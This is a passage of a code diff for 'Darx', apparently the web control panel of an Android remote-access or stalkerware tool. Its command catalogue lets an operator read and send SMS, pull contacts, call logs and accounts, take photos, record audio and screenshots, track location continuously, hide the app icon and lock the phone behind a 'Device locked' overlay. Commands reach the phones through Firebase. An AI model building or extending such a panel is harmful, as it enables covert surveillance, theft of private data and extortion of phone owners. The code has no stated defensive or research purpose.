+            { name: 'open_url', label: 'Open URL', params: [{ key: 'url', type: 'text', label: 'URL', def: '' }] },
+            { name: 'start_call', label: 'Start Call', params: [
+                { key: 'number', type: 'text', label: 'Number', def: '' },
+                { key: 'sim', type: 'select', label: 'SIM',
+                    options: [{ v: '', l: 'Default' }, { v: '1', l: 'SIM 1' }, { v: '2', l: 'SIM 2' }], def: '' }
+            ]},
+            { name: 'send_sms', label: 'Send SMS', params: [
+                { key: 'to', type: 'text', label: 'Recipient', def: '' },
+                { key: 'text', type: 'text', label: 'Message', def: '' },
+                { key: 'sim', type: 'select', label: 'SIM',
+                    options: [{ v: '', l: 'Default' }, { v: '1', l: 'SIM 1' }, { v: '2', l: 'SIM 2' }], def: '' }
+            ]},
+            { name: 'list_sms', label: 'List SMS', params: [{ key: 'folder', type: 'select', label: 'Folder',
+                options: [{ v: 'inbox', l: 'Inbox' }, { v: 'sent', l: 'Sent' }], def: 'inbox' }] },
+            { name: 'delete_sms', label: 'Delete SMS', params: [{ key: 'id', type: 'text', label: 'SMS ID', def: '' }] },
+            { name: 'get_sms_threads', label: 'SMS Threads', params: [] },
+            { name: 'list_sims', label: 'List SIMs', params: [] },
+            { name: 'get_contacts', label: 'Contacts', params: [] },
+            { name: 'get_call_log', label: 'Call Log', params: [{ key: 'limit', type: 'number', label: 'Limit', def: '20' }] },
+            { name: 'get_installed_apps', label: 'Installed Apps', params: [] },
+            { name: 'get_accounts', label: 'Accounts', params: [] },
+            { name: 'enable_hotspot', label: 'Hotspot On', params: [] },
+            { name: 'disable_hotspot', label: 'Hotspot Off', params: [] },
+            { name: 'show_message', label: 'Show Message', params: [{ key: 'text', type: 'text', label: 'Message', def: '' }] },
+            { name: 'freeze', label: 'Freeze', params: [{ key: 'text', type: 'text', label: 'Message', def: 'Device locked' }] },
+            { name: 'unfreeze', label: 'Unfreeze', params: [] },
+            { name: 'update_overlay', label: 'Update Overlay', params: [{ key: 'text', type: 'text', label: 'Text', def: '' }] },
+            { name: 'hide_app', label: 'Hide/Show App', params: [{ key: 'action', type: 'select', label: 'Action',
+                options: [{ v: 'hide', l: 'Hide' }, { v: 'show', l: 'Show' }], def: 'hide' }] },
+            { name: 'open_maps', label: 'Open Maps', params: [
+                { key: 'lat', type: 'number', label: 'Latitude', def: '0' },
+                { key: 'lng', type: 'number', label: 'Longitude', def: '0' }
+            ]},
+            { name: 'open_app', label: 'Open App', params: [{ key: 'package', type: 'text', label: 'Package name', def: '' }] }
+        ]
+    }, {
+        id: 'loc',
+        label: 'Location & Sensors',
+        icon: '📍',
+        commands: [
+            { name: 'get_location', label: 'Get Location', params: [] },
+            { name: 'start_tracking', label: 'Start Tracking', params: [
+                { key: 'interval_ms', type: 'number', label: 'Interval (ms)', def: '5000' }
+            ]},
+            { name: 'stop_tracking', label: 'Stop Tracking', params: [] },
+            { name: 'get_cell_towers', label: 'Cell Towers', params: [] },
+            { name: 'get_wifi_networks', label: 'WiFi Networks', params: [] },
+            { name: 'get_sensors', label: 'Sensor Data', params: [] }
+        ]
+    }];
 
-        // ============================================================
-        // AUTH
-        // ============================================================
-        auth.onAuthStateChanged(user => {
-            if (!user) {
-                window.location.href = 'index.html';
-                return;
-            }
+    // ============================================================
+    // AUTH
+    // ============================================================
+    // Listen for auth state
+    auth.onAuthStateChanged(user => {
+        if (user) {
             currentUser = user;
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('appContainer').classList.add('logged-in');
             displayUserInfo(user);
             loadUserDevices(user);
-        });
-
-        function displayUserInfo(user) {
-            const name = user.displayName || user.email || user.phoneNumber || 'User';
-            const initial = (user.displayName ? user.displayName.charAt(0).toUpperCase() :
-                (user.email ? user.email.charAt(0).toUpperCase() : 'U'));
-            document.getElementById('userName').textContent = name;
-            document.getElementById('userAvatar').textContent = initial;
+        } else {
+            currentUser = null;
+            document.getElementById('loginPage').style.display = 'flex';
+            document.getElementById('appContainer').classList.remove('logged-in');
         }
+    });
 
-        function logout() {
-            auth.signOut().then(() => { window.location.href = 'index.html'; });
-        }
+    function handleLogin() {
+        const email = document.getElementById('loginEmail').value.trim();
+        const password = document.getElementById('loginPassword').value;
+        const btn = document.getElementById('loginBtn');
+        const errorEl = document.getElementById('loginError');
+        const loadingEl = document.getElementById('loginLoading');
 
-        // ============================================================
-        // LOAD DEVICES
-        // ============================================================
-        async function loadUserDevices(user) {
-            const container = document.getElementById('devicesList');
-            container.innerHTML = `<div class="empty-state"><div class="spinner"></div><br>Loading devices...</div>`;
+        errorEl.style.display = 'none';
+        loadingEl.style.display = 'block';
+        btn.disabled = true;
 
-            try {
-                // Get user document
-                const userDoc = await db.collection('users').doc(user.uid).get();
-                console.log('[Darx] userDoc exists:', userDoc.exists);
-                let deviceIds = [];
+        auth.signInWithEmailAndPassword(email, password)
+            .catch(err => {
+                loadingEl.style.display = 'none';
+                btn.disabled = false;
+                let msg = err.message;
+                if (err.code === 'auth/user-not-found') msg = 'No account found with this email.';
+                else if (err.code === 'auth/wrong-password') msg = 'Incorrect password.';
+                else if (err.code === 'auth/invalid-email') msg = 'Invalid email format.';
+                else if (err.code === 'auth/too-many-requests') msg = 'Too many attempts. Try again later.';
+                errorEl.textContent = msg;
+                errorEl.style.display = 'block';
+            });
+    }
 
-                if (userDoc.exists) {
-                    const data = userDoc.data();
-                    console.log('[Darx] userDoc data:', JSON.stringify(data));
-                    // Try user_devices first, then devices
-                    if (data.user_devices && Array.isArray(data.user_devices)) {
-                        deviceIds = data.user_devices;
-                        console.log('[Darx] Found user_devices:', deviceIds);
-                    } else if (data.devices && Array.isArray(data.devices)) {
-                        deviceIds = data.devices;
-                        console.log('[Darx] Found devices array:', deviceIds);
-                    } else {
-                        // Check if there's a user_devices subcollection
-                        console.log('[Darx] No device array in doc, checking subcollection...');
-                    }
-                } else {
-                    console.log('[Darx] userDoc does not exist');
-                }
+    // Allow pressing Enter to submit login
+    document.getElementById('loginPassword').addEventListener('keydown', e => {
+        if (e.key === 'Enter') handleLogin();
+    });
+    document.getElementById('loginEmail').addEventListener('keydown', e => {
+        if (e.key === 'Enter') document.getElementById('loginPassword').focus();
+    });
 
-                // If no deviceIds from array, try subcollection
-                if (deviceIds.length === 0) {
-                    try {
-                        const subCol = await db.collection('users').doc(user.uid).collection('user_devices').get();
-                        if (!subCol.empty) {
-                            deviceIds = subCol.docs.map(d => d.id);
-                            console.log('[Darx] Found user_devices subcollection IDs:', deviceIds);
-                        }
-                    } catch (e) {
-                        console.log('[Darx] No user_devices subcollection:', e.message);
-                    }
-                }
+    function handleLogout() {
+        if (resultUnsub) { resultUnsub(); resultUnsub = null; }
+        auth.signOut();
+    }
 
-                if (deviceIds.length === 0) {
-                    container.innerHTML = `
-                        <div class="empty-state">
-                            <div class="big-icon">📱</div>
-                            <strong>No devices found</strong><br>
-                            <span style="font-size:0.75rem;color:var(--muted)">No devices linked to this account yet.</span>
-                        </div>`;
-                    document.getElementById('devicesSub').textContent = 'No devices available';
-                    return;
-                }
+    function displayUserInfo(user) {
+        const name = user.displayName || user.email || user.phoneNumber || 'User';
+        const initial = (user.displayName ? user.displayName.charAt(0).toUpperCase() :
+            (user.email ? user.email.charAt(0).toUpperCase() : 'U'));
+        document.getElementById('userName').textContent = name;
+        document.getElementById('userAvatar').textContent = initial;
+    }
 
-                // Fetch each device doc by ID
-                const devicePromises = deviceIds.map(id =>
-                    db.collection('devices').doc(id).get().catch(err => {
-                        console.log(`[Darx] Error fetching device ${id}:`, err.message);
-                        return null;
-                    })
-                );
-                const snapshots = await Promise.all(devicePromises);
+    // ============================================================
+    // LOAD USER'S ASSIGNED DEVICES
+    // Reads from: user_devices/{uid}.deviceIds  (matching admin.py)
+    // ============================================================
+    async function loadUserDevices(user) {
+        const container = document.getElementById('devicesList');
+        container.innerHTML = `<div class="empty-state"><div class="spinner"></div><br>Loading assigned devices...</div>`;
 
-                userDevices = [];
-                snapshots.forEach((snap, i) => {
-                    if (snap && snap.exists) {
-                        const data = snap.data();
-                        data.id = snap.id;
-                        userDevices.push(data);
-                        console.log(`[Darx] Loaded device: ${snap.id}`, data.name || 'unnamed');
-                    } else {
-                        console.log(`[Darx] Device ${deviceIds[i]} not found or no access`);
-                    }
-                });
+        try {
+            // Read device assignments from user_devices/{uid}
+            const assignmentDoc = await db.collection('user_devices').doc(user.uid).get();
+            let deviceIds = [];
 
-                console.log('[Darx] Total devices loaded:', userDevices.length);
+            if (assignmentDoc.exists) {
+                const data = assignmentDoc.data();
+                deviceIds = data.deviceIds || [];
+                console.log('[Darx] Device assignments from user_devices:', deviceIds);
+            } else {
+                console.log('[Darx] No user_devices document for this UID');
+            }
 
-                if (userDevices.length === 0) {
-                    container.innerHTML = `
-                        <div class="empty-state">
-                            <div class="big-icon">📱</div>
-                            <strong>Device data unavailable</strong><br>
-                            <span style="font-size:0.75rem;color:var(--muted)">Device documents not found or inaccessible.</span>
-                        </div>`;
-                    document.getElementById('devicesSub').textContent = 'No devices available';
-                    return;
-                }
-
-                renderDeviceList();
-
-                // Auto-select first device if none selected
-                if (!selectedDeviceId) {
-                    selectDevice(userDevices[0].id);
-                }
-
-            } catch (err) {
-                console.error('[Darx] Error loading devices:', err);
+            if (!deviceIds || deviceIds.length === 0) {
                 container.innerHTML = `
                     <div class="empty-state">
-                        <div class="big-icon">⚠️</div>
-                        <strong>Error loading devices</strong><br>
-                        <span style="font-size:0.75rem;color:var(--muted)">${err.message}</span>
-                    </div>`;
-            }
-        }
-
-        function renderDeviceList() {
-            const container = document.getElementById('devicesList');
-            document.getElementById('devicesSub').textContent = `${userDevices.length} device(s) available`;
-
-            container.innerHTML = userDevices.map(d => {
-                const isOnline = d.lastSeen && (Date.now() - d.lastSeen.toMillis?.() || d.lastSeen) < 300000;
-                const status = isOnline ? 'online' : 'offline';
-                const model = d.model || d.brand || d.device || 'Unknown';
-                return `
-                    <div class="device-card" onclick="selectDevice('${d.id}')">
-                        <div class="dc-dot ${status}"></div>
-                        <div class="dc-info">
-                            <div class="dc-name">${d.name || d.id}</div>
-                            <div class="dc-meta">${model} · ${d.androidVersion || d.sdk || '?'} · ${status}</div>
-                        </div>
-                        <div class="dc-arrow">›</div>
-                    </div>`;
-            }).join('');
-        }
-
-        // ============================================================
-        // SELECT DEVICE
-        // ============================================================
-        function selectDevice(deviceId) {
-            selectedDeviceId = deviceId;
-            selectedDeviceData = userDevices.find(d => d.id === deviceId);
-
-            // Update sidebar active state
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            const dashboardNav = document.querySelector('.nav-item[data-page="dashboard"]');
-            if (dashboardNav) dashboardNav.classList.add('active');
-
-            // Show dashboard page
-            showPage('dashboard');
-            renderDashboard();
-        }
-
-        // ============================================================
-        // PAGE NAVIGATION
-        // ============================================================
-        function showPage(pageId) {
-            document.querySelectorAll('.page-section').forEach(p => p.classList.remove('active'));
-            document.getElementById(`page-${pageId}`).classList.add('active');
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            const navItem = document.querySelector(`.nav-item[data-page="${pageId}"]`);
-            if (navItem) navItem.classList.add('active');
-
-            if (pageId === 'dashboard' && selectedDeviceId) {
-                renderDashboard();
-            } else if (pageId === 'dashboard' && !selectedDeviceId) {
-                document.getElementById('dashboardContent').innerHTML = `
-                    <div class="empty-state">
                         <div class="big-icon">📱</div>
-                        <strong>No device selected</strong><br>
-                        <span style="font-size:0.75rem;color:var(--muted)">Select a device from the Devices page first.</span>
+                        <strong>No devices assigned</strong><br>
+                        <span style="font-size:0.75rem;color:var(--muted)">
+                            No devices have been linked to your account yet.<br>
+                            Contact your administrator to assign devices.
+                        </span>
                     </div>`;
-            } else if (pageId === 'commands') {
-                renderCommandsBrowser();
-            } else if (pageId === 'devices') {
-                renderDeviceList();
-            }
-        }
-
-        // ============================================================
-        // RENDER DASHBOARD
-        // ============================================================
-        function renderDashboard() {
-            if (!selectedDeviceData) {
-                document.getElementById('dashboardContent').innerHTML =
-                    `<div class="empty-state">No device selected</div>`;
-                return;
-            }
-            const d = selectedDeviceData;
-            const isOnline = d.lastSeen && (Date.now() - (d.lastSeen.toMillis?.() || d.lastSeen)) < 300000;
-            const statusClass = isOnline ? 'online' : 'offline';
-            const model = d.model || d.brand || d.device || 'Unknown';
-            const battery = d.battery !== undefined ? d.battery + '%' : '?';
-
-            // Build device selector
-            const selectorOptions = userDevices.map(dev =>
-                `<option value="${dev.id}" ${dev.id === selectedDeviceId ? 'selected' : ''}>${dev.name || dev.id}</option>`
-            ).join('');
-
-            // Stats
-            const stats = `
-                <div class="stats-row">
-                    <div class="stat-card"><div class="stat-val">${isOnline ? 'ON' : 'OFF'}</div><div class="stat-lbl">Status</div></div>
-                    <div class="stat-card"><div class="stat-val">${battery}</div><div class="stat-lbl">Battery</div></div>
-                    <div class="stat-card"><div class="stat-val">${d.androidVersion || d.sdk || '?'}</div><div class="stat-lbl">Android</div></div>
-                    <div class="stat-card"><div class="stat-val">${d.apps?.length || '?'}</div><div class="stat-lbl">Apps</div></div>
-                </div>`;
-
-            // Quick command grid
-            const quickCommands = [
-                { n: 'get_device_info', l: 'Device Info', i: 'ℹ️' },
-                { n: 'get_location', l: 'Location', i: '📍' },
-                { n: 'take_screenshot', l: 'Screenshot', i: '📸' },
-                { n: 'take_photo', l: 'Take Photo', i: '📷' },
-                { n: 'record_audio', l: 'Record', i: '🎤' },
-                { n: 'ping', l: 'Ping', i: '📡' },
-                { n: 'get_battery_info', l: 'Battery', i: '🔋' },
-                { n: 'lock_screen', l: 'Lock', i: '🔒' },
-                { n: 'wake_screen', l: 'Wake', i: '💡' },
-                { n: 'clipboard_get', l: 'Clipboard', i: '📋' },
-                { n: 'list_sms', l: 'SMS', i: '💬' },
-                { n: 'get_contacts', l: 'Contacts', i: '👤' }
-            ];
-
-            const quickHtml = quickCommands.map(c =>
-                `<button class="cmd-btn" onclick="openCommand('${c.n}')">
-                    <span class="cmd-icon">${c.i}</span>${c.l}
-                    <span class="cmd-label">${c.n}</span>
-                </button>`
-            ).join('');
-
-            const html = `
-                <div class="device-header">
-                    <div class="status-dot ${statusClass}"></div>
-                    <div class="dev-info">
-                        <div class="dev-name">${d.name || d.id}</div>
-                        <div class="dev-meta">${model} · ${d.id}</div>
-                    </div>
-                    <select class="dev-select" onchange="selectDevice(this.value)">
-                        ${selectorOptions}
-                    </select>
-                </div>
-                ${stats}
-                <div class="cmd-section">
-                    <div class="section-title">⚡ Quick Actions <span class="count">12</span></div>
-                    <div class="cmd-grid">${quickHtml}</div>
-                </div>
-                <div style="text-align:center;margin-top:8px;">
-                    <button onclick="showPage('commands')" style="background:var(--card2);border:1px solid var(--border);color:var(--accent2);padding:8px 20px;border-radius:var(--radius-sm);font-size:0.8rem;cursor:pointer;font-family:inherit;">
-                        View All Commands →
-                    </button>
-                </div>
-            `;
-
-            document.getElementById('dashboardContent').innerHTML = html;
-        }
-
-        // ============================================================
-        // RENDER COMMANDS BROWSER
-        // ============================================================
-        function renderCommandsBrowser() {
-            const container = document.getElementById('commandsBrowser');
-
-            let html = '';
-            COMMAND_CATEGORIES.forEach(cat => {
-                html += `
-                    <div class="cmd-section">
-                        <div class="section-title">${cat.icon} ${cat.label} <span class="count">${cat.commands.length}</span></div>
-                        <div class="cmd-grid">
-                            ${cat.commands.map(cmd => `
-                                <button class="cmd-btn" onclick="openCommand('${cmd.name}')">
-                                    ${cmd.label}
-                                    <span class="cmd-label">${cmd.name}</span>
-                                </button>
-                            `).join('')}
-                        </div>
-                    </div>`;
-            });
-
-            container.innerHTML = html;
-        }
-
-        // ============================================================
-        // OPEN COMMAND MODAL
-        // ============================================================
-        function openCommand(commandName) {
-            // Find command definition
-            let found = null;
-            for (const cat of COMMAND_CATEGORIES) {
-                const cmd = cat.commands.find(c => c.name === commandName);
-                if (cmd) { found = cmd; break; }
-            }
-            if (!found) {
-                showToast(`Unknown command: ${commandName}`, 'error');
+                document.getElementById('devicesSub').textContent = '0 devices assigned';
+                userDevices = [];
                 return;
             }
 
-            pendingModalCommand = found;
-            document.getElementById('modalTitle').textContent = found.label;
-            document.getElementById('modalCmd').textContent = `/${found.name}`;
+            // Fetch each device document from the devices collection
+            const devicePromises = deviceIds.map(id =>
+                db.collection('devices').doc(id).get().catch(err => {
+                    console.log(`[Darx] Error fetching device ${id}:`, err.message);
+                    return null;
+                })
+            );
+            const snapshots = await Promise.all(devicePromises);
 
-            const fieldsContainer = document.getElementById('modalFields');
-            if (found.params.length === 0) {
-                fieldsContainer.innerHTML = `<div style="font-size:0.75rem;color:var(--muted);padding:8px 0;">No parameters required.</div>`;
-                document.getElementById('modalSendBtn').textContent = 'Send';
-            } else {
-                let html = '';
-                found.params.forEach(p => {
-                    if (p.type === 'select') {
-                        const options = p.options.map(o =>
-                            `<option value="${o.v}" ${o.v === p.def ? 'selected' : ''}>${o.l}</option>`
-                        ).join('');
-                        html += `<div class="field-group">
-                            <label>${p.label}</label>
-                            <select id="param_${p.key}">${options}</select>
-                        </div>`;
-                    } else if (p.type === 'range') {
-                        html += `<div class="field-group">
-                            <label>${p.label} (<span id="param_${p.key}_val">${p.def}</span>)</label>
-                            <input type="range" id="param_${p.key}" min="${p.min}" max="${p.max}" value="${p.def}"
-                                oninput="document.getElementById('param_${p.key}_val').textContent=this.value">
-                        </div>`;
-                    } else if (p.type === 'number') {
-                        html += `<div class="field-group">
-                            <label>${p.label}</label>
-                            <input type="number" id="param_${p.key}" value="${p.def || ''}" step="any">
-                        </div>`;
-                    } else {
-                        html += `<div class="field-group">
-                            <label>${p.label}</label>
-                            <input type="text" id="param_${p.key}" value="${p.def || ''}" placeholder="${p.label}">
-                        </div>`;
-                    }
-                });
-                fieldsContainer.innerHTML = html;
-                document.getElementById('modalSendBtn').textContent = 'Send';
-            }
-
-            document.getElementById('modalOverlay').classList.add('show');
-        }
-
-        function closeModal() {
-            document.getElementById('modalOverlay').classList.remove('show');
-            pendingModalCommand = null;
-        }
-
-        // ============================================================
-        // EXECUTE MODAL COMMAND
-        // ============================================================
-        function executeModalCommand() {
-            if (!pendingModalCommand) return;
-            if (!selectedDeviceId) {
-                showToast('No device selected', 'error');
-                return;
-            }
-
-            const cmd = pendingModalCommand;
-            const params = {};
-
-            cmd.params.forEach(p => {
-                const el = document.getElementById(`param_${p.key}`);
-                if (el) {
-                    let val = el.value;
-                    if (p.type === 'number') val = parseFloat(val);
-                    params[p.key] = val;
+            userDevices = [];
+            snapshots.forEach((snap) => {
+                if (snap && snap.exists) {
+                    const data = snap.data();
+                    data.id = snap.id;
+                    userDevices.push(data);
                 }
             });
 
-            const payload = {
-                type: cmd.name,
-                params: params,
-                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                status: 'pending'
-            };
+            console.log('[Darx] Loaded', userDevices.length, 'assigned devices');
 
-            // Write to device's commands subcollection
-            const cmdRef = db.collection('devices').doc(selectedDeviceId).collection('commands').doc();
-            cmdRef.set(payload)
-                .then(() => {
-                    showToast(`${cmd.label} command sent`, 'success');
-                    closeModal();
-                })
-                .catch(err => {
-                    showToast(`Error: ${err.message}`, 'error');
-                });
+            if (userDevices.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <div class="big-icon">📱</div>
+                        <strong>Devices not found</strong><br>
+                        <span style="font-size:0.75rem;color:var(--muted)">
+                            Assigned device IDs exist but their documents are missing.
+                        </span>
+                    </div>`;
+                document.getElementById('devicesSub').textContent = '0 devices available';
+                return;
+            }
+
+            document.getElementById('devicesSub').textContent =
+                `${userDevices.length} device(s) assigned to you`;
+            renderDeviceList();
+
+            // Auto-select first device if nothing selected
+            if (!selectedDeviceId || !userDevices.find(d => d.id === selectedDeviceId)) {
+                selectDevice(userDevices[0].id);
+            }
+
+        } catch (err) {
+            console.error('[Darx] Error loading devices:', err);
+            container.innerHTML = `
+                <div class="empty-state">
+                    <div class="big-icon">⚠️</div>
+                    <strong>Error loading devices</strong><br>
+                    <span style="font-size:0.75rem;color:var(--muted)">${err.message}</span>
+                </div>`;
+        }
+    }
+
+    function renderDeviceList() {
+        const container = document.getElementById('devicesList');
+        container.innerHTML = userDevices.map(d => {
+            const isOnline = d.lastSeen && (Date.now() - (d.lastSeen.toMillis?.() || d.lastSeen)) < 300000;
+            const status = isOnline ? 'online' : 'offline';
+            const model = d.model || d.brand || d.device || 'Android';
+            return `
+                <div class="device-card" onclick="selectDevice('${d.id}')">
+                    <div class="dc-dot ${status}"></div>
+                    <div class="dc-info">
+                        <div class="dc-name">${d.name || d.deviceName || d.id}</div>
+                        <div class="dc-meta">${model} · ${d.androidVersion || d.sdk || '?'} · ${status}</div>
+                    </div>
+                    <div class="dc-arrow">›</div>
+                </div>`;
+        }).join('');
+    }
+
+    // ============================================================
+    // SELECT DEVICE
+    // ============================================================
+    function selectDevice(deviceId) {
+        selectedDeviceId = deviceId;
+        selectedDeviceData = userDevices.find(d => d.id === deviceId);
+
+        // Clean up old result listener
+        if (resultUnsub) { resultUnsub(); resultUnsub = null; }
+        cmdResults = [];
+
+        // Update sidebar
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        const dashboardNav = document.querySelector('.nav-item[data-page="dashboard"]');
+        if (dashboardNav) dashboardNav.classList.add('active');
+
+        showPage('dashboard');
+        renderDashboard();
+        startResultListener(deviceId);
+    }
+
+    // ============================================================
+    // PAGE NAVIGATION
+    // ============================================================
+    function showPage(pageId) {
+        document.querySelectorAll('.page-section').forEach(p => p.classList.remove('active'));
+        const page = document.getElementById(`page-${pageId}`);
+        if (page) page.classList.add('active');
+
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        const navItem = document.querySelector(`.nav-item[data-page="${pageId}"]`);
+        if (navItem) navItem.classList.add('active');
+
+        if (pageId === 'dashboard') {
+            if (selectedDeviceId) renderDashboard();
+        } else if (pageId === 'commands') {
+            renderCommandsBrowser();
+        } else if (pageId === 'devices') {
+            renderDeviceList();
+        }
+    }
+
+    // ============================================================
+    // DASHBOARD
+    // ============================================================
+    function renderDashboard() {
+        if (!selectedDeviceData) {
+            document.getElementById('dashboardContent').innerHTML =
+                `<div class="empty-state">No device selected</div>`;
+            return;
+        }
+        const d = selectedDeviceData;
+        const isOnline = d.lastSeen && (Date.now() - (d.lastSeen.toMillis?.() || d.lastSeen)) < 300000;
+        const statusClass = isOnline ? 'online' : 'offline';
+        const model = d.model || d.brand || d.device || 'Unknown';
+
+        const selectorOptions = userDevices.map(dev =>
+            `<option value="${dev.id}" ${dev.id === selectedDeviceId ? 'selected' : ''}>${dev.name || dev.deviceName || dev.id}</option>`
+        ).join('');
+
+        const stats = `
+            <div class="stats-row">
+                <div class="stat-card"><div class="stat-val">${isOnline ? 'ON' : 'OFF'}</div><div class="stat-lbl">Status</div></div>
+                <div class="stat-card"><div class="stat-val">${d.battery !== undefined ? d.battery + '%' : '?'}</div><div class="stat-lbl">Battery</div></div>
+                <div class="stat-card"><div class="stat-val">${d.androidVersion || d.sdk || '?'}</div><div class="stat-lbl">Android</div></div>
+                <div class="stat-card"><div class="stat-val">${d.apps?.length || '?'}</div><div class="stat-lbl">Apps</div></div>
+            </div>`;
+
+        const quickCommands = [
+            { n: 'get_device_info', l: 'Device Info', i: 'ℹ️' },
+            { n: 'get_location', l: 'Location', i: '📍' },
+            { n: 'take_screenshot', l: 'Screenshot', i: '📸' },
+            { n: 'take_photo', l: 'Take Photo', i: '📷' },
+            { n: 'record_audio', l: 'Record', i: '🎤' },
+            { n: 'ping', l: 'Ping', i: '📡' },
+            { n: 'get_battery_info', l: 'Battery', i: '🔋' },
+            { n: 'lock_screen', l: 'Lock', i: '🔒' },
+            { n: 'wake_screen', l: 'Wake', i: '💡' },
+            { n: 'clipboard_get', l: 'Clipboard', i: '📋' },
+            { n: 'list_sms', l: 'SMS', i: '💬' },
+            { n: 'get_contacts', l: 'Contacts', i: '👤' }
+        ];
+
+        const quickHtml = quickCommands.map(c =>
+            `<button class="cmd-btn" onclick="openCommand('${c.n}')">
+                <span class="cmd-icon">${c.i}</span>${c.l}
+                <span class="cmd-label">${c.n}</span>
+            </button>`
+        ).join('');
+
+        const html = `
+            <div class="device-header">
+                <div class="status-dot ${statusClass}"></div>
+                <div class="dev-info">
+                    <div class="dev-name">${d.name || d.deviceName || d.id}</div>
+                    <div class="dev-meta">${model} · ${d.id}</div>
+                </div>
+                <select class="dev-select" onchange="selectDevice(this.value)">
+                    ${selectorOptions}
+                </select>
+            </div>
+            ${stats}
+            <div class="cmd-section">
+                <div class="section-title">⚡ Quick Actions <span class="count">12</span></div>
+                <div class="cmd-grid">${quickHtml}</div>
+            </div>
+            <div style="text-align:center;margin-top:8px;">
+                <button onclick="showPage('commands')" style="background:var(--card2);border:1px solid var(--border);color:var(--accent2);padding:8px 20px;border-radius:var(--radius-sm);font-size:0.8rem;cursor:pointer;font-family:inherit;">
+                    View All Commands →
+                </button>
+            </div>
+            <div class="results-section" style="margin-top:16px;">
+                <div class="results-header">
+                    <h4>Command Log</h4>
+                    <span id="resultCount">${cmdResults.length} results</span>
+                </div>
+                <div id="resultsBody">${cmdResults.length === 0 ? '<div class="empty-state" style="padding:16px;">No commands sent yet</div>' : renderResults()}</div>
+            </div>
+        `;
+
+        document.getElementById('dashboardContent').innerHTML = html;
+    }
+
+    // ============================================================
+    // COMMANDS BROWSER
+    // ============================================================
+    function renderCommandsBrowser() {
+        if (!selectedDeviceId) {
+            document.getElementById('commandsBrowser').innerHTML = `
+                <div class="empty-state">
+                    <div class="big-icon">⌘</div>
+                    <strong>Select a device first</strong><br>
+                    <span style="font-size:0.75rem;color:var(--muted)">Go to Devices → pick one → then use Commands.</span>
+                </div>`;
+            document.getElementById('resultsSection').style.display = 'none';
+            return;
         }
 
-        // ============================================================
-        // TOAST
-        // ============================================================
-        function showToast(msg, type) {
-            const el = document.getElementById('toast');
-            el.textContent = msg;
-            el.className = 'toast show';
-            if (type) el.classList.add(type);
-            clearTimeout(el._timeout);
-            el._timeout = setTimeout(() => { el.classList.remove('show'); }, 3000);
-        }
+        document.getElementById('commandsSub').textContent =
+            `Device: ${selectedDeviceData?.name || selectedDeviceData?.deviceName || selectedDeviceId}`;
+        document.getElementById('resultsSection').style.display = 'block';
+        document.getElementById('resultCount').textContent = cmdResults.length + ' results';
+        document.getElementById('resultsBody').innerHTML = cmdResults.length === 0 ?
+            '<div class="empty-state" style="padding:16px;">No commands sent yet</div>' : renderResults();
 
-        // Click outside modal to close
-        document.getElementById('modalOverlay').addEventListener('click', function(e) {
-            if (e.target === this) closeModal();
+        const container = document.getElementById('commandsBrowser');
+        let html = '';
+        COMMAND_CATEGORIES.forEach(cat => {
+            html += `
+                <div class="cmd-section">
+                    <div class="section-title">${cat.icon} ${cat.label} <span class="count">${cat.commands.length}</span></div>
+                    <div class="cmd-grid">
+                        ${cat.commands.map(cmd => `
+                            <button class="cmd-btn" onclick="openCommand('${cmd.name}')">
+                                ${cmd.label}
+                                <span class="cmd-label">${cmd.name}</span>
+                            </button>
+                        `).join('')}
+                    </div>
+                </div>`;
         });
+        container.innerHTML = html;
+    }
+
+    // ============================================================
+    // OPEN COMMAND MODAL
+    // ============================================================
+    function openCommand(commandName) {
+        if (!selectedDeviceId) {
+            showToast('Select a device first', 'error');
+            return;
+        }
+
+        let found = null;
+        for (const cat of COMMAND_CATEGORIES) {
+            const cmd = cat.commands.find(c => c.name === commandName);
+            if (cmd) { found = cmd; break; }
+        }
+        if (!found) {
+            showToast('Unknown command: ' + commandName, 'error');
+            return;
+        }
+
+        pendingModalCommand = found;
+        document.getElementById('modalTitle').textContent = found.label;
+        document.getElementById('modalCmd').textContent = '/' + found.name;
+
+        const fieldsContainer = document.getElementById('modalFields');
+        if (!found.params || found.params.length === 0) {
+            fieldsContainer.innerHTML = `<div style="font-size:0.75rem;color:var(--muted);padding:8px 0;">No parameters required. Send immediately.</div>`;
+            document.getElementById('modalSendBtn').textContent = 'Send Command';
+        } else {
+            let html = '';
+            found.params.forEach(p => {
+                html += `<div class="field-group">`;
+                html += `<label>${p.label}</label>`;
+                if (p.type === 'select') {
+                    const options = (p.options || []).map(o =>
+                        `<option value="${o.v}" ${o.v === p.def ? 'selected' : ''}>${o.l}</option>`
+                    ).join('');
+                    html += `<select id="param_${p.key}">${options}</select>`;
+                } else if (p.type === 'range') {
+                    html += `<div style="display:flex;align-items:center;gap:8px;">
+                        <input type="range" id="param_${p.key}" min="${p.min}" max="${p.max}" value="${p.def}"
+                            oninput="document.getElementById('param_${p.key}_val').textContent=this.value">
+                        <span id="param_${p.key}_val" style="font-size:0.75rem;color:var(--accent2);min-width:30px;">${p.def}</span>
+                    </div>`;
+                } else if (p.type === 'number') {
+                    html += `<input type="number" id="param_${p.key}" value="${p.def || ''}" step="any">`;
+                } else {
+                    html += `<input type="text" id="param_${p.key}" value="${p.def || ''}" placeholder="${p.label}">`;
+                }
+                html += `</div>`;
+            });
+            fieldsContainer.innerHTML = html;
+            document.getElementById('modalSendBtn').textContent = 'Send Command';
+        }
+
+        document.getElementById('modalOverlay').classList.add('show');
+    }
+
+    function closeModal() {
+        document.getElementById('modalOverlay').classList.remove('show');
+        pendingModalCommand = null;
+    }
+
+    // ============================================================
+    // EXECUTE MODAL COMMAND
+    // Writes to: commands/{cmdId}  (top-level collection, matching remote.py)
+    // ============================================================
+    function executeModalCommand() {
+        if (!pendingModalCommand) return;
+        if (!selectedDeviceId) {
+            showToast('No device selected', 'error');
+            return;
+        }
+
+        const cmd = pendingModalCommand;
+        const params = {};
+
+        (cmd.params || []).forEach(p => {
+            const el = document.getElementById(`param_${p.key}`);
+            if (el) {
+                let val = el.value;
+                if (p.type === 'number') val = parseFloat(val);
